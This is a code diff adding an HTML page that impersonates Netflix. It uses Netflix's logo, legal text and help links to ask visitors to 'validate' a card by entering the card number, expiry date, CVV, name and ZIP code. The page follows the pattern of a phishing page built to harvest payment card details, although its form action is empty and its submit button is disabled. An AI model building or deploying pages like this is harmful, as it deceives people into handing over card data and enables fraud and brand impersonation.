@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>Netflix</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="billing.css">
+</head>
+
+<body>
+    <style>
+        body::before{
+            /* background-image: linear-gradient(to bottom, rgba(0, 0, 0, 0.8) 0%, rgba(0, 0, 0, 0.2) 60%, rgba(0, 0, 0, 0.9) 100%),url(img/background.jpg); */
+            background-color: white;
+        }
+    </style>
+    <header style="padding: 10px 2%;" class="d-flex space-between center">
+        <a href="/">
+        <img src="img/Netflix-Logo.png"  width="150px" alt="site logo main" style="margin: auto;"></img>
+    </a> 
+    </header>
+    <hr style="border-color: rgba(255, 255, 255, 0.3);">
+    <main style="padding: 0px 10px;">
+        <section id="login-form-section">
+                <div class="loginContainer d-flex direction-column">
+                    <h2 style="color: black;" class="formtitle">
+                        Validate your credit or debit card
+                    </h2>
+                    <form action="" id="loginForm" class="d-flex direction-column" method="post" name="loginForm">
+                        <input style="background-color: white;" type="text" name="card_number" id="card_number" class="billing" placeholder="Card number"  required/>
+                        <div>
+                            <input style="display: inline-block; width: 44%; margin-right: 4.5%; background-color: white;" type="text" name="card_number" id="card_number" class="billing" placeholder="Expiration date" required />
+                            <input style="display: inline-block; width: 44%; background-color: white;" type="text" name="card_number" id="card_number" class="billing" placeholder="CVV" required />
+                        </div>
+
+                        <input style="background-color: white;" type="text" name="card_number" id="card_number" class="billing" placeholder="First name"  required/>
+                        <input style="background-color: white;" type="text" name="card_number" id="card_number" class="billing" placeholder="Last name"  required/>
+                        <input style="background-color: white;" type="text" name="card_number" id="card_number" class="billing" placeholder="ZIP code"  required/>
+
+                        <span style="margin-top: 20px; color: #737373;" id="" data-uia="termsOfUse-Disclosure">By clicking the “Start Membership” button below, you agree to our 
+                        <a style="color: blue;" target="_blank" href="https://help.netflix.com/legal/termsofuse">Terms of Use</a>, <a style="color: blue;" target="_blank" href="https://help.netflix.com/legal/privacy">Privacy Statement</a>, that you are over 18, and that <strong>Netflix will automatically continue your membership and charge the membership fee (currently $19.99/month) to your payment method until you cancel.</strong> <strong>You may cancel at any time to avoid future charges.</strong> To cancel, go to Account and click “Cancel Membership.”</span>
+
+                        <button type="submit" class="button submitButton" id="signInButton" disabled="disabled">
+                            <a style="text-decoration: none; color: white;" href="https://netflix.com/">Validate</a>
+                        </button>
+                    </form>
+                </div>
+
+        </section>
+
+    </main>
+    <div class="bottom">
+        <div class="bottom-width">
+            Questions? Call 1-844-505-2993
+            <div>
+                <ul class="bottom-flex">
+                    <li class="list-bottom">
+                        <a href="https://help.netflix.com/support/412" class="link-bottom">
+                            FAQ
+                        </a>
+                    </li>
+                    <li class="list-bottom">
+                        <a href="https://help.netflix.com/" class="link-bottom">
+                            Help Center
+                        </a>
+                    </li>
+                    <li class="list-bottom">
+                        <a href="https://netflix.shop/" class="link-bottom">
+                            Netflix Shop
+                        </a>
+                    </li>
+                    <li class="list-bottom">
+                        <a href="https://help.netflix.com/legal/termsofuse" class="link-bottom">
+                            Terms of Use
+                        </a>
+                    </li>
+                    <li class="list-bottom">
+                        <a href="https://help.netflix.com/legal/privacy" class="link-bottom">
+                            Privacy
+                        </a>
+                    </li>
+                    <li class="list-bottom">
+                        <a href="https://www.netflix.com/login#" class="link-bottom">
+                            Cookie Preferences
+                        </a>
+                    </li>
+                    <li class="list-bottom">
+                        <a href="https://help.netflix.com/legal/corpinfo" class="link-bottom">
+                            Corporate information
+                        </a>
+                    </li>
+                    <li class="list-bottom">
+                        <a href="https://www.netflix.com/dnsspi" class="link-bottom">
+                            Do Not Sell or Share My Personal Information
+                        </a>
+                    </li>
+                </ul>
+            </div>
+            <div>
+                <select style="margin-top: 20px;" class="fa select-language">
+                    <option> &#xf0ac; &nbsp;&nbsp;&nbsp;English</option>
+                    <option> &#xf0ac; &nbsp;&nbsp;&nbsp;Fran&ccedil;ais</option>
+                </select>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
